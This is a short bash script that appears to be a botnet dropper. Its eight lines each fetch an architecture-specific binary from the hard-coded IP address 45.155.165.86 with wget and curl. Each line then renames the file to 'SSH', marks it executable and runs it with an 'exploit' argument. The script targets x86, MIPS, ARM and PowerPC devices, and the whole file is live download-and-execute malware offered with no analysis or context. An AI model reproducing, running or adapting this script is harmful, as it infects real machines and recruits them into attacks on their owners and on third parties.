#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/x86; curl -O http://45.155.165.86/bins/x86;cat x86 >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/mips; curl -O http://45.155.165.86/bins/mips;cat mips >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/mpsl; curl -O http://45.155.165.86/bins/mpsl;cat mpsl >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/arm5; curl -O http://45.155.165.86/bins/arm5;cat arm5 >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/arm6; curl -O http://45.155.165.86/bins/arm6;cat arm6 >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/arm7; curl -O http://45.155.165.86/bins/arm7;cat arm7 >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/ppc; curl -O http://45.155.165.86/bins/ppc;cat ppc >SSH;chmod +x *;./SSH exploit
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.155.165.86/bins/arm; curl -O http://45.155.165.86/bins/arm;cat arm >SSH;chmod +x *;./SSH exploit
